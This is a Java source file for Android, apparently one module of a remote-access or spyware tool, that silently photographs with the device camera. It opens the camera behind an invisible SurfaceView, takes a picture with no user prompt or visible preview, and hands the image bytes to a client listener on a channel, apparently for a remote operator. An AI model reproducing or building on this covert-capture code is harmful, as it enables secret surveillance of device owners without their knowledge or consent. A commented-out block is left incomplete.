package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

public class PhotoTaker {

	Camera cam;
	ClientListener ctx;
	int chan ;
	SurfaceHolder holder;
	
	private PictureCallback pic = new PictureCallback() {

	    public void onPictureTaken(byte[] data, Camera camera) {
	    		
	    	ctx.handleData(chan, data);
	        Log.i("PhotoTaker", "After take picture !");
	        cam.release();
	        cam = null;
	    }
	};
	
	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan ;
		ctx = c;
	}
	/*
	public boolean takePhoto() {
		Intent photoActivity = new Intent(this, PhotoActivity.class);
		photoActivity.setAction(PhotoTaker.class.getName());
		ctx.star
	}
	*/
	
	public boolean takePhoto() {
        if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
        	return false;
        Log.i("PhotoTaker", "Just before Open !");
        try {
        	cam = Camera.open();
        } catch (Exception e) { return false; }
        
        Log.i("PhotoTaker", "Right after Open !");
        
        if (cam == null)
        	return false;
        
        SurfaceView view = new SurfaceView(ctx);
        try {
        	holder = view.getHolder();
        	cam.setPreviewDisplay(holder);
        } catch(IOException e) { return false; }
        
        cam.startPreview();
        cam.takePicture(null, null, pic);

        return true;
	}
	

}
